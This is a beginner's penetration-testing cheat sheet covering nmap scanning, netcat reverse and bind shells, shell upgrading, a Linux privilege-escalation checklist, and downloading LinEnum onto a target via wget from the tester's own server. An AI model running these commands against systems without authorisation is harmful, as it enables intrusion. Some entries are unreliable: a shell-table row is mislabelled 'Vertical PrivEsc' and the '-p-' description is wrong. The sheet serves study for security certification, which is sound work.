# About this Cheat Sheet. (For begginers)
I made this Cheat Sheet with no other purpose than help myself in my own learning way. Since I'm not able to remember all these commands or practices, I've resorted to make this file so I can make faster searchs according to my needs. This is a begginer Cheat Sheet, the level corresponds approximately to the eLearnSecurity Junior Penetration Tester Certificate.


## Networking.
#### Nmap - For vulnerability scanning and network discovery.
| Usage                 |
| --------------------- |
| `nmap <options> <IP>` |


| Parameter name                             | Description                                                                       |
| -------------------------------------------| --------------------------------------------------------------------------------- |
| `-p <port-number>`                         | Scans a port or some of them.  (it scans the first 1.000 ports by default.)       |
| `-p- <startPort-number endPort-number>`   | Scans a range of ports. (By default it scans all ports.)                          |
| `-sV`                                      | Gives information about service's versions.                                       |
| `-Pn`                                      | Skip the ping test, instead scan everytarget host provided.                       |

There are a lot of more parameters, they can be found [here](https://nmap.org/book/man-briefoptions.html "Nmap parameters.").



## Reverse and Blind Shells
| Name               | Description                                                                    
| ------------------ | ------------------------------------------------------------------------- |
| Reverse Shell      |  Target connect to us. (We set up a listener before they connect to us.)  |
| Vertical PrivEsc   |  We connect to the target. (The target is the one who set up a listener.) |


#### How to use Netcat to set up a listener. (Reverse shell)
```bash
nc -lvnp <port-number>
```

| Parameters         | Description                                                                    
| ------------------ | ------------------------------------------------------------------------- |
| `-l`               |  Tells netcat that this will be a listener.                               |
| `-v`               |  Verbose output.                                                          |
| `-n`               |  Not resolve hostnames or use DNS                                         |
| `-p`               |  The port that we will sue                                                |


#### How to use Netcat to connect to a listener. (Blind shell)
```bash
nc <target-ip> <chosen-port>
```


## Upgrade shell.
After we have a shell, we should upgrade it, because netcat isn't too stable. Also we can't use arrow keys, tab key or Ctrl + C.

#### Using Python

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
[Ctrl+Z]
stty raw -echo; fg
````
#### Using Rlwrap
After we install it with `sudo apt install rlwrap` we need to use nc like this.

```bash
rlwrap nc -lvnp <port>
```


## Privilage Escalation

Understanding the two main privilage escalation variants.

| Name         | Description                                                                       |
| -------------------------- | --------------------------------------------------------------------------------- |
| Horizontal PrivEsc         |  Used for hijack another user with the same privilages. Some users even if they're not admin can have SUID files, or they are allowed to use sudo for differents files or programs.   |
| Vertical PrivEsc | You just take an administrator account. |

TODO: Make a picture with a diagram.

#### LinEnum
We can use [LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh "LinEnum") for enumerate privilage escalation. Below we can find a table for things we should check for privilage escalation in spite of LinEnum will do the task for us.


| Things to check for   |
| -------------         |
| SUID / GUID Files     |
| Readable /etc/shadow  |
| Writable /etc/shadow  |
| Writable /etc/passwd  |
| Sudo Escape sequences |
| Cron Jobs - File permissions  |
| Cron Jobs - PATH env          |
| Passwords & Keys History File |
| Looking for SSH or Config files |
| NFS |
| Kernel exploits |
| Escaping VI editor |

There are several ways of executing the script in the target machine. However, creating a Python web server would be the second eassier one in case we can't recreate the script by coping and paste it.

1. Create a Python web server.
2. Download the script in the target machine.
3. Make the script executable.

```bash
1. python -m SimpleHTTPServer [PORT]
2. wget http://IP:PORT/FILE
3. chmod +x [FILE]
```

#### How to find SUID binaries.

```bash 
find / -perm -u=s -type f 2>/dev/null
           ---- or ----
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```


[This cheat sheet is still under construction...]
